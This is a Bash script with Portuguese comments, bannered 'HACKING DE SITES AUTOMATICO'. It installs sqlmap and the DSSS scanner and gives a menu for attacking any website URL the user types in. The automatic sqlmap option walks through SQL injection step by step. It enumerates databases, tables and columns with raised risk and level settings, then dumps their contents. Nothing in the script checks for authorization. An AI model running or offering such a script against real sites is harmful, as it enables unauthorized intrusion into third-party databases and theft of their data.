#! /bin/bash
#
#Limpar a tela
clear
#
#Fazendo o programa dormir por 2 segundos
sleep 2
#
#BANNER
echo
echo "====================================="
echo  "=                                 ="
echo  "=        HACKING DE SITES         ="
echo  "=           AUTOMATICO            ="
echo  "=                                 ="
echo  "=              2018               ="
echo "====================================="
echo
#
#
#
#MENU
echo
echo "===================================="
echo "=                                  ="
echo "= \033[1;34m[\033[1;31m1]>> \033[1;33mInstalar sqlmap"
echo "= \033[1;34m[\033[1;31m2]>> \033[1;33mUsar sqlmap Automatico"
echo "= \033[1;34m[\033[1;31m3]>> \033[1;33mInstalarDSSS"
echo "= \033[1;34m[\033[1;31m4]>> \033[1;33mVer se o site é vulneravel"
echo "=                                  ="
echo "===================================="
echo
#
#
#Escolher entre as quatro opcoes
#obtigado por usar

read -p "[+]=>" opcao
#
#
#
if [ "$opcao" = "1" ];then
clear
figlet INSTALL
#
 echo "Instalando sqlmap..."; sleep 2
git clone https://github.com/sqlmapproject/sqlmap
echo "Instalação concluida!"
fi
if [ "$opcao" = "2" ];then

cd sqlmap
clear
figlet Sqlmap
#
 echo "\033[1;32m\n\n[+]=> INICIANDO SQLMAP AUTOMATICO...";sleep 2
#
#Read para digitar a url
echo "\033[1;36m\n[+]=> DIGITE OU COLE A URL PARA O SQLMAP\033[1;31m"
read -p "[+]=> " url
#
#Começa a listar as databases
python2 sqlmap.py -u $url --risk 2 --level 2 --batch --dbs
#
#Read para digitar o nome da database listada
echo "\033[1;36m[+]=> DIGITE O NOME DA DATABASE\033[1;31m"
read -p "[+]=> " db
#
#Começa a listar as tabelas
python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db --tables
#
#Read para digitar o nome da tabela
echo "\033[1;36m[+]=> DIGITE O NOME DA TABELA\033[1;31m"
read -p "[+]=> " tabela
#
#Começa a listar as colunas
python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela
#
#Read para digitar o nome da coluna
echo "\033[1;36m[+]=> DIGITE O NOME DA COLUNA\033[1;31m"
read -p "[+]=> " coluna
#
#Extrai todo o trabalho feito
python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela -C $coluna --dump
fi
if [ "$opcao" = "3" ];then
clear
figlet Install
 echo "Instalando DSSS..."; sleep 2
git clone https://github.com/stamparm/DSSS
echo "Instalção concluida!"
fi
if [ "$opcao" = "4" ];then
clear
figlet DSSS
 echo "\033[1;36m[+]=> DIGITE OU COLE A URL DO SITE\033[1;31m"
#
read -p "[+]>>" url
#
#Entrando na pasta do DSSS
cd DSSS
#Executando
python2 dsss.py --url $url
fi
#
#Fazendo o programa dormir por 2 segundo
sleep 2
#
#Saindo


exit
